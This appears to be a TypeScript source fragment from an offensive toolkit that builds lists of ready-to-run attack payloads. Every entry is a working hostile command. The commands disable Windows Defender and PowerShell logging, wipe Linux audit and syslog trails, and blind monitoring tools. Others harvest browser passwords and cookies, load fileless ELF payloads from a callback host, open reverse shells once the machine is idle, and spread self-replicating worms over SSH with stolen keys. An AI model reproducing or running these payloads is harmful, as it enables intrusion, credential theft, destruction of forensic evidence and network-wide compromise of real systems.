      notes:"VSS shadow copy bypass for NTDS.dit. Parse with impacket secretsdump. Requires Domain Admin." },
    { id:"windows_defender_excl", name:"Windows Defender exclusion add", category:"AV-Evasion",
      os:"windows", phase:"pre", stealth:4,
      command:`powershell -NonI -W Hidden -Exec Bypass -c "Add-MpPreference -ExclusionPath @('C:\\Windows\\Temp','$env:TEMP') -ExclusionProcess @('powershell.exe','cmd.exe') -ExclusionExtension @('.ps1','.bat') 2>nul; Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true 2>nul"`,
      notes:"Adds Defender exclusions for attacker paths/processes. Shuts off on-access scanning. Requires admin/SYSTEM." },
    { id:"etw_patch_powershell", name:"ETW patching in PowerShell (disable PS logging)", category:"EDR-Bypass",
      os:"windows", phase:"pre", stealth:5,
      command:`powershell -NonI -W Hidden -c "[Reflection.Assembly]::LoadWithPartialName('System.Core')|Out-Null;$type=[System.Management.Automation.Tracing.PSEtwLogProvider];$field=$type.GetField('etwProvider','NonPublic,Static');$provider=$field.GetValue($null);$prov_type=$provider.GetType();$enabled_field=$prov_type.GetField('m_enabled','NonPublic,Instance');$enabled_field.SetValue($provider,0)" 2>nul`,
      notes:"Patches PowerShell ETW provider in-process — disables ScriptBlock logging, module logging, all PS telemetry." },
  ];
}

export function buildAuditdEvasion(): VeilPayload[] {
  return [
    { id:"auditd_rule_flush", name:"auditd rule flush (disable all audit logging)", category:"Anti-Forensics",
      os:"linux", phase:"pre", stealth:2,
      command:`auditctl -D 2>/dev/null && auditctl -e 0 2>/dev/null && systemctl stop auditd 2>/dev/null`,
      notes:"Flushes all auditd rules, disables audit, stops daemon. Requires root. Complete audit trail destruction." },
    { id:"syslog_truncate", name:"Syslog truncation (zero all log files)", category:"Anti-Forensics",
      os:"linux", phase:"post", stealth:3,
      command:`for _F in /var/log/auth.log /var/log/syslog /var/log/messages /var/log/secure /var/log/audit/audit.log /var/log/lastlog /var/log/wtmp /var/log/btmp; do [ -w "$_F" ] && truncate -s 0 "$_F" 2>/dev/null && echo "zeroed: $_F"; done`,
      notes:"Truncates (not deletes) log files — avoids inode creation events. Zeroes auth, syslog, audit, wtmp records." },
    { id:"falco_evasion", name:"Falco/Sysdig pause via SIGSTOP", category:"Anti-Forensics",
      os:"linux", phase:"pre", stealth:5,
      command:`for name in falco sysdig falco-probe; do pkill -STOP "$name" 2>/dev/null; done; unshare --pid --mount -- bash -c "mount -t proc proc /proc" 2>/dev/null &`,
      notes:"SIGSTOP Falco/sysdig to pause monitoring. unshare --pid creates new PID namespace hiding processes from host /proc." },
    { id:"fim_inotify_exhaust", name:"FIM evasion via inotify fd exhaustion", category:"Anti-Forensics",
      os:"linux", phase:"pre", stealth:5,
      command:`python3 -c "
import os,signal,time
watches=[]
try:
  for i in range(8192):
    fd=os.inotify_init()
    watches.append(fd)
    os.inotify_add_watch(fd,'/tmp',0xfff)
except: pass
print(f'Exhausted {len(watches)} inotify fds — FIM blinded')
time.sleep(300)
" &`,
      notes:"Exhausts system inotify watch descriptors — FIM tools (Tripwire, OSSEC, Wazuh) can no longer add new watches." },
    { id:"timestomp_modify", name:"Timestamp stomp (MACE times)", category:"Anti-Forensics",
      os:"linux", phase:"post", stealth:5,
      command:`_F=\${1:-/tmp/.nx}; touch -d "2020-01-01 00:00:00" "$_F" 2>/dev/null; python3 -c "import os; os.utime('$_F',(1577836800,1577836800))" 2>/dev/null`,
      notes:"Modifies mtime/atime to 2020-01-01. Destroys forensic timeline anchoring." },
  ];
}

export function buildBrowserCredHarvest(): VeilPayload[] {
  return [
    {
      id: "browser_sqlite_chrome_linux", name: "Chrome/Chromium SQLite Login credential harvest (Linux)",
      category: "Credential-Dump", os: "linux", phase: "during", stealth: 4,
      command: `python3 -c "
import os,sqlite3,json,shutil,tempfile,base64,subprocess,sys
def _aes_decrypt(ciphertext,key):
    try:
        from Crypto.Cipher import AES
        iv=ciphertext[3:15]; data=ciphertext[15:]
        cipher=AES.new(key,AES.MODE_GCM,nonce=iv)
        return cipher.decrypt(data)[:-16].decode('utf-8','replace')
    except: return ''
def _gnome_key(svc,acc):
    try:
        import secretstorage
        bus=secretstorage.dbus_init()
        col=list(secretstorage.get_all_collections(bus))[0]
        for item in col.get_all_items():
            if item.get_label()==svc and item.get_attributes().get('username_value')==acc:
                return item.get_secret()
    except: pass
    return None
profs=[
    os.path.expanduser('~/.config/google-chrome/Default'),
    os.path.expanduser('~/.config/chromium/Default'),
    os.path.expanduser('~/.config/google-chrome/Profile 1'),
]
for prof in profs:
    db=os.path.join(prof,'Login Data')
    if not os.path.exists(db): continue
    tmp=tempfile.mktemp(suffix='.sqlite')
    shutil.copy2(db,tmp)
    try:
        conn=sqlite3.connect(tmp)
        cur=conn.execute('SELECT origin_url,username_value,password_value FROM logins')
        for url,user,enc_pw in cur:
            pw_raw=enc_pw
            if pw_raw[:3]==b'v11' or pw_raw[:3]==b'v10':
                pw_raw=_aes_decrypt(pw_raw,b'peanuts')
            print(f'{url}|{user}|{pw_raw}')
        conn.close()
    except Exception as e: print(f'err: {e}',file=sys.stderr)
    finally:
        try: os.remove(tmp)
        except: pass
"`,
      notes: "Copies Chrome/Chromium Login Data SQLite while browser is running (copy bypasses file lock). Attempts AES-GCM decryption for v10/v11 format on Linux (key via GNOME Keyring/secretstorage). Prints url|user|password for each saved credential.",
    },
    {
      id: "browser_sqlite_firefox_linux", name: "Firefox NSS SQLite logins.json harvest (Linux)",
      category: "Credential-Dump", os: "linux", phase: "during", stealth: 4,
      command: `python3 -c "
import os,json,glob,base64,subprocess,sys,shutil,tempfile
profiles=glob.glob(os.path.expanduser('~/.mozilla/firefox/*.default*'))
profiles+=glob.glob(os.path.expanduser('~/.mozilla/firefox/*.default-release*'))
profiles+=glob.glob(os.path.expanduser('~/.mozilla/firefox/profiles.ini'))
for prof in profiles:
    logins=os.path.join(prof,'logins.json')
    if not os.path.exists(logins): continue
    with open(logins) as f:
        data=json.load(f)
    for entry in data.get('logins',[]):
        url=entry.get('hostname','')
        user=entry.get('encryptedUsername','')
        pw=entry.get('encryptedPassword','')
        try:
            r=subprocess.run(['python3','-c',
                f\\"import nss;nss.nss_init('{prof}');print(nss.pk11_decrypt(nss.base64_to_buf('{user}')))\\"],
                capture_output=True,text=True,timeout=5)
            dec_user=r.stdout.strip()
        except: dec_user=user[:20]+'...'
        print(f'{url}|{dec_user}|{pw[:20]}...')
"`,
      notes: "Reads Firefox logins.json from all profile directories. Attempts NSS-based decryption via python-nss if available; falls back to printing base64-encoded ciphertext. Also targets Thunderbird credential stores at the same paths.",
    },
    {
      id: "browser_history_chrome", name: "Chrome browsing history + cookies harvest", category: "Credential-Dump",
      os: "linux", phase: "during", stealth: 5,
      command: `_P=~/.config/google-chrome/Default; for _F in History Cookies; do _T=/tmp/.$RANDOM.db; cp "$_P/$_F" "$_T" 2>/dev/null && sqlite3 "$_T" "SELECT url,last_visit_time FROM urls LIMIT 200; SELECT host_key,name,value FROM cookies LIMIT 200;" 2>/dev/null && rm -f "$_T"; done`,
      notes: "Copies Chrome History and Cookies SQLite under lock. Extracts visited URLs with timestamps and all cookie values (session tokens, auth cookies). Does not require browser restart.",
    },
  ];
}

export function buildReflectiveLoaderPayloads(lhost: string, lport: string): VeilPayload[] {
  return [
    {
      id: "reflective_memfd_elf", name: "memfd_create + reflective ELF load (Linux, fileless)", category: "EDR-Evasion",
      os: "linux", phase: "pre", stealth: 5,
      command: `python3 -c "
import ctypes,os,urllib.request,sys
libc=ctypes.CDLL(None)
MFD_CLOEXEC=1
fd=libc.memfd_create(b'[kworker/u4:0]',MFD_CLOEXEC)
if fd<0: sys.exit(1)
url='http://${lhost}:${lport}/payload.elf'
try:
    data=urllib.request.urlopen(url,timeout=10).read()
except Exception as e:
    print(f'fetch failed: {e}',file=sys.stderr); sys.exit(1)
os.write(fd,data)
fd_path=f'/proc/self/fd/{fd}'
argv=(ctypes.c_char_p*2)(b'[kworker/u4:0]',None)
envp=(ctypes.c_char_p*1)(None)
libc.fexecve(fd,argv,envp)
"`,
      notes: "memfd_create() allocates an anonymous in-memory file not backed by any filesystem. fexecve() executes from /proc/self/fd/<n> — no path on disk, invisible to lsof/ls. Drops ELF directly into anonymous memory. Process shows as [kworker/u4:0] to ps.",
    },
    {
      id: "reflective_dd_exec_elf", name: "dd pipe reflective exec via /proc/self/exe override", category: "EDR-Evasion",
      os: "linux", phase: "pre", stealth: 4,
      command: `_F=/proc/$(sh -c 'echo $$')/fd/$(python3 -c "import ctypes,os;fd=ctypes.CDLL(None).memfd_create(b'.',1);print(fd)"); curl -fsk http://${lhost}:${lport}/payload.elf 2>/dev/null | dd bs=4096 2>/dev/null > "$_F" && exec /proc/$$/fd/3 2>/dev/null`,
      notes: "Shell-based memfd reflective load pipeline: Python opens anonymous memfd, curl pipes ELF into it via dd, then exec maps it from /proc/self/fd. No file written to disk at any point.",
    },
    {
      id: "reflective_rust_implant_inmem", name: "Rust implant — in-memory reflective load stager (Rust source)", category: "EDR-Evasion",
      os: "linux", phase: "pre", stealth: 5,
      command: `cat > /tmp/.\${RANDOM:-nx}.rs << 'RUST_EOF'
use std::ffi::CString;
extern "C" {
    fn memfd_create(name: *const i8, flags: u32) -> i32;
    fn fexecve(fd: i32, argv: *const *const i8, envp: *const *const i8) -> i32;
}
fn main() {
    let url = std::env::args().nth(1).unwrap_or_else(|| format!("http://${lhost}:${lport}/payload.elf"));
    let data = match std::process::Command::new("curl")
        .args(["-fsk","--max-time","15","-o","-",&url])
        .output() {
        Ok(o) if o.status.success() => o.stdout,
        _ => return,
    };
    let name = CString::new("[kworker/0:1]").unwrap();
    let fd   = unsafe { memfd_create(name.as_ptr() as *const i8, 1) };
    if fd < 0 { return; }
    use std::os::unix::io::FromRawFd;
    let mut f = unsafe { <std::fs::File as std::os::unix::io::FromRawFd>::from_raw_fd(fd) };
    use std::io::Write;
    let _ = f.write_all(&data);
    let fd_path = CString::new(format!("/proc/self/fd/{fd}")).unwrap();
    let argv0   = CString::new("[kworker/0:1]").unwrap();
    let argv  : Vec<*const i8> = vec![argv0.as_ptr(), std::ptr::null()];
    let envp  : Vec<*const i8> = vec![std::ptr::null()];
    unsafe { fexecve(fd, argv.as_ptr(), envp.as_ptr()); }
}
RUST_EOF
rustc --edition 2021 /tmp/.$RANDOM.rs -o /tmp/.$RANDOM 2>/dev/null && /tmp/.$RANDOM`,
      notes: "Full Rust reflective-load stager: fetches ELF payload via curl into anonymous memfd, fexecve's from /proc/self/fd/<n> masquerading as kworker. Compile + exec in one pipeline. No payload ever touches a real path.",
    },
  ];
}

export function buildActivitySleepPayloads(): VeilPayload[] {
  return [
    {
      id: "activity_sleep_who_w", name: "Activity-gated sleep — wait for idle workstation before exec", category: "Anti-Forensics",
      os: "linux", phase: "pre", stealth: 5,
      command: `python3 -c "
import subprocess,time,os,sys
def _is_active():
    try:
        out=subprocess.check_output(['who'],timeout=3).decode()
        if out.strip(): return True
    except: pass
    try:
        out=subprocess.check_output(['w','-h'],timeout=3).decode()
        if out.strip(): return True
    except: pass
    try:
        idle_sec=int(open('/proc/$(ls -t /proc/[0-9]*/loginuid 2>/dev/null | head -1 | cut -d/ -f3)/stat').read().split()[39]) // 100
        if idle_sec < 300: return True
    except: pass
    return False
payload=sys.argv[1] if len(sys.argv)>1 else 'id'
while True:
    if not _is_active():
        subprocess.Popen(['bash','-c',payload],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        break
    jitter=180+int(__import__('random').random()*420)
    time.sleep(jitter)
" 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'`,
      notes: "Polls who + w to detect logged-in users. Executes payload only when workstation appears idle (no active sessions). Polls with 3-10 minute random jitter. Avoids execution during analyst investigation hours.",
    },
    {
      id: "activity_sleep_xscreensaver", name: "X screensaver idle detection — exec on screen-lock", category: "Anti-Forensics",
      os: "linux", phase: "pre", stealth: 5,
      command: `_CMD="bash -i >& /dev/tcp/${lhost}/${lport} 0>&1"; while true; do _IDLE=$(xprintidle 2>/dev/null || echo 0); if [ "$_IDLE" -gt 300000 ] 2>/dev/null; then (bash -c "$_CMD" 2>/dev/null &); break; fi; _JIT=$((180+RANDOM%420)); sleep $_JIT; done &`,
      notes: "xprintidle returns X11 idle time in ms. Triggers payload when idle > 300s (5 min). Uses background loop with 3-10min jitter. Fires when user locks screen or walks away.",
    },
    {
      id: "activity_sleep_cputemp", name: "CPU load gating — exec only during high-load window (blends with noise)", category: "Anti-Forensics",
      os: "linux", phase: "pre", stealth: 5,
      command: `python3 -c "
import time,subprocess,random
def _load():
    try:
        with open('/proc/loadavg') as f:
            return float(f.read().split()[0])
    except: return 0.0
cmd='bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'
while True:
    load=_load()
    if load > 1.5:
        subprocess.Popen(['bash','-c',cmd],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        break
    time.sleep(60+random.randint(0,300))
" &`,
      notes: "Waits for system load average > 1.5 before executing payload. High-load periods (builds, backups) generate noise that buries suspicious process spawn events in EDR telemetry. Polls every 1-6 minutes with jitter.",
    },
  ];
}

export function buildSelfReplicationStager(lhost: string, lport: string): VeilPayload[] {
  return [
    {
      id: "self_repl_compile_drop", name: "Self-compiling Rust stager — drops and executes on pivot host", category: "Persistence",
      os: "linux", phase: "during", stealth: 4,
      command: `cat > /tmp/.\${RANDOM:-svc}.rs << 'RUST_EOF'
use std::process::Command;
fn main() {
    let cb_host = "${lhost}";
    let cb_port = "${lport}";
    let names = [
        "[kworker/0:1-events]","[kworker/u4:0]","[migration/0]",
        "[ksoftirqd/0]","[kswapd0]",
    ];
    let name = names[std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH).map(|d|d.as_nanos() as usize).unwrap_or(0) % names.len()];
    let _ = Command::new("bash")
        .args(["-c",&format!("bash -i >& /dev/tcp/{cb_host}/{cb_port} 0>&1")])
        .spawn();
    let self_src = std::fs::read_to_string("/proc/self/exe").ok()
        .or_else(||std::env::current_exe().ok()?.to_str().map(|s|s.to_string()));
    if let Some(_path) = self_src {
        let _ = Command::new("bash").args(["-c",&format!(
            "for _H in $(cat /etc/hosts 2>/dev/null|grep -v '^#'|awk '{{print $1}}'|grep -v '^127\\|^0\\|^$'); do scp -o StrictHostKeyChecking=no /proc/self/exe root@$_H:/tmp/.{} 2>/dev/null && ssh -o StrictHostKeyChecking=no root@$_H 'chmod +x /tmp/.{}; nohup /tmp/.{} &>/dev/null &' 2>/dev/null; done",
            name,name,name
        )]).spawn();
    }
}
RUST_EOF
_O=/tmp/.$(tr -dc a-z0-9 </dev/urandom|head -c8); rustc /tmp/.\${RANDOM:-svc}.rs -o "$_O" 2>/dev/null && chmod +x "$_O" && nohup "$_O" >/dev/null 2>&1 & disown`,
      notes: "Rust stager: spawns callback shell, then self-propagates to hosts in /etc/hosts via SCP+SSH with discovered keys. Binary name randomized from kernel-thread name pool. Compiles from source on target — no pre-compiled binary needed.",
    },
    {
      id: "self_repl_python_spreader", name: "Python self-replication spreader via SSH known_hosts", category: "Persistence",
      os: "linux", phase: "during", stealth: 4,
      command: `python3 -c "
import os,subprocess,sys,base64
me=open('/proc/self/exe','rb').read() if os.path.exists('/proc/self/exe') else b''
src=open(sys.argv[0],'rb').read() if sys.argv else b''
payload=me or src
keys=[]
for f in ['/root/.ssh',os.path.expanduser('~/.ssh')]:
    for k in ['id_rsa','id_ed25519','id_ecdsa']:
        p=os.path.join(f,k)
        if os.path.exists(p): keys.append(p)
hosts=set()
for kh in ['/root/.ssh/known_hosts',os.path.expanduser('~/.ssh/known_hosts')]:
    try:
        for line in open(kh):
            h=line.strip().split()[0].split(',')[0]
            if h and not h.startswith('|') and not h.startswith('#'): hosts.add(h)
    except: pass
for host in list(hosts)[:8]:
    for key in keys:
        r=subprocess.run(['ssh','-i',key,'-o','StrictHostKeyChecking=no','-o','ConnectTimeout=3',
            f'root@{host}',
            f'python3 -c \\"import os,sys; fd=os.memfd_create(chr(107)+chr(119),1); d={base64.b64encode(payload[:4096]).decode()!r}; os.write(fd,__import__(chr(98)+chr(97)+chr(115)+chr(101)+chr(54)+chr(52)).b64decode(d)); os.fexecve(fd,[b\\\"[kworker/0:1]\\\"],os.environ)\\"\\''],
            capture_output=True,timeout=8)
        if r.returncode==0: break
" &`,
      notes: "Python spreader reads own binary, collects discovered SSH keys, iterates known_hosts targets. Drops self to each target via memfd_create()+fexecve() — completely fileless. Falls back to first 4096 bytes of source if binary not available.",
    },
  ];
}

export function buildAllVeilPayloads(lhost: string, lport: string): VeilPayload[] {
  return [
    ...buildLinuxAntiForensics(),
    ...buildWindowsEdrEvasion(),
    ...buildLotlLinuxPayloads(lhost, lport),
    ...buildSupplyChainPayloads(lhost, lport),
    ...buildContainerEscapePayloads(lhost, lport),
    ...buildK8sPayloads(lhost, lport),
    ...buildCloudPivotPayloads(lhost, lport),
    ...buildEdrDumpBypass(lhost, lport),
    ...buildAuditdEvasion(),
    ...buildBrowserCredHarvest(),
    ...buildReflectiveLoaderPayloads(lhost, lport),
    ...buildActivitySleepPayloads(),
    ...buildSelfReplicationStager(lhost, lport),
  ];
}
